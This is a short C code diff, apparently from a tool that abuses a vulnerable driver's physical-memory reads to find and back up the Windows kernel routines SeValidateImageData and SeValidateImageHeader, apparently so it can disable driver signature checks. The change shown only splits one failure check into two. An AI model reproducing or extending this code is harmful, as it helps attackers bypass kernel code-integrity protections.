@@ -218,6 +218,14 @@ void NTAPI NtProcessStartup(PPEB pPeb)
 		validateImageDataPattern,
 		sizeof(validateImageDataPattern));
 
+	if (NULL == validateImageDataPatternAddress)
+	{
+		dbgprintf("Failed to locate SeValidateImageData address\n");
+
+		goto _NtProcessStartup_Cleanup;
+	}
+
+
 	validateImageHeaderPatternAddress = SearchForPatternPhysical(
 		vulnerableDriverHandle,
 		pLoadedVulnerableDriver->PhysicalReadRoutine,
@@ -226,12 +234,13 @@ void NTAPI NtProcessStartup(PPEB pPeb)
 		validateImageHeaderPattern,
 		sizeof(validateImageHeaderPattern));
 
-	if (NULL == validateImageDataPatternAddress || NULL == validateImageHeaderPatternAddress)
+
+	if(NULL == validateImageHeaderPatternAddress)
 	{
-		dbgprintf("Failed to locate patterns\n");
+		dbgprintf("Failed to locate SeValidateImageHeader address");
 
 		goto _NtProcessStartup_Cleanup;
-	}
+	}	
 
 	// Backup the original function's data
 	if (!pLoadedVulnerableDriver->PhysicalReadRoutine(
